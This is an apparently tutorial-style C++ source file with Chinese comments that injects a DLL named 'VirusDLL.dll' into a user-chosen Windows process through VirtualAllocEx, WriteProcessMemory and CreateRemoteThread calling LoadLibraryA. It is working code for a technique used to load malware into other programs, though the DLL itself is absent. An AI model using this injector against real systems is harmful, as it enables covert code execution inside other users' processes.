#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<iostream>
#include<tchar.h>
using namespace std;
bool WriteMemory(const HANDLE hProcess, const DWORD dwSize, const LPVOID lpRemoteBuf, const LPVOID Data)
{
	DWORD dwNumberOfBytesWritten;
	if (lpRemoteBuf == NULL)//lpRemoteBuf表示一个指向目标进程地址空间的缓冲区
	{
		return false;//如果lpRemoteBuf等于NULL表示在目标进程地址空间申请内存失败了
	}
	if (WriteProcessMemory(hProcess, lpRemoteBuf, Data, dwSize, &dwNumberOfBytesWritten))//如果申请内存没有失败则想目标进程的缓冲区写入数据
	{
		if (dwSize != dwNumberOfBytesWritten)//dwSize是要写入的数据大小,dwNumberOfBytesWritten是实际写入的数据大小
		{
			//如果dwSize不等于dwNumberOfBytesWritten则表示输入写入不完整,同样以失败告终
			VirtualFreeEx(hProcess, lpRemoteBuf, dwSize, MEM_DECOMMIT);
			CloseHandle(hProcess);
			return false;
		}
	}
	else
	{
		CloseHandle(hProcess);
		return false;
	}
	return true;
}
bool ProcessInjection(const unsigned int ProcessID)
{
	//OpenProcess第一个参数指定要对该进程进行的操作(也就是权限)
	//PROCESS_CREATE_THREAD表示可以在目标进程中创建远程线程，也就是使用CreateRemoteThread的权限；
	//PROCESS_VM_OPERATION表示可以在目标进程中分配/释放内存的权限，也就是使用 VirtualAllocEx/VirtualFreeEx的权限；
	//PROCESS_VM_WRITE表示可以向目标进程的地址空间写入数据，也就是使用 WriteProcessMemory的权限。
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ProcessID);
	LPCTSTR Data = _T("VirusDLL.dll");
	DWORD dwSize;
	dwSize = _tcslen(Data) + 1;//计算要在目标进程中申请的内存大小
	LPVOID lpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);//在目标进程中申请内存

																							//这里就是调用上面我们刚才打造的写目标进程地址空间的函数,为了程序的结构不混乱所以把这部分单独封装成一个函数;
	if (!WriteMemory(hProcess, dwSize, lpRemoteBuf, (LPVOID)Data)) return false;

	DWORD dwRemoteThreadHandle;
	//这里有必要说明一写lpRemoteEntryFun是一个LPVOID指针,指向LoadLibraryA函数,但是我现在取的LoadLibraryA函数地址
	//是针对本进程而言的函数地址,对于目标进程而言LoadLibraryA的函数地址可能和我的不一样;
	//这个道理是对的,但是对于有些函数来说,也不完全正确,因为LoadLibraryA位于kernel32.dll之中;
	//而Win32下每个应用程序都会把kernel32.dll加载到进程地址空间中一个固定的地址中;
	//所以在这里LoadLibraryA函数地址在每个应用程序中的地址是一样的;
	LPVOID lpRemoteEntryFun = LoadLibraryA;
	//接下来就是创建一个远程线程,线程的入口函数是LoadLibraryA,参数就是我们已经写入目标进程地址空间的DLL名称
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteEntryFun, lpRemoteBuf, 0, &dwRemoteThreadHandle);
	WaitForSingleObject(hRemoteThread, INFINITE);//等待LoadLibraryA执行完毕
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	cout << "DLL已经成功注入!" << endl;
	return true;
}

int main()
{
	unsigned int ProcessID;
	PROCESSENTRY32 stPE32;
	stPE32.dwSize = sizeof(stPE32);
	HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bool bMore = (bool)Process32First(hSnapshot, &stPE32);
	while (bMore)
	{
		cout << stPE32.szExeFile << " \t " << stPE32.th32ProcessID << endl;
		bMore = (bool)Process32Next(hSnapshot, &stPE32);
	}
	//在此我们可以选择一个要注入的进程ID
	cout << "请输入要注入的进程ID:";
	cin >> ProcessID;
	ProcessInjection(ProcessID);

	return 0;
}

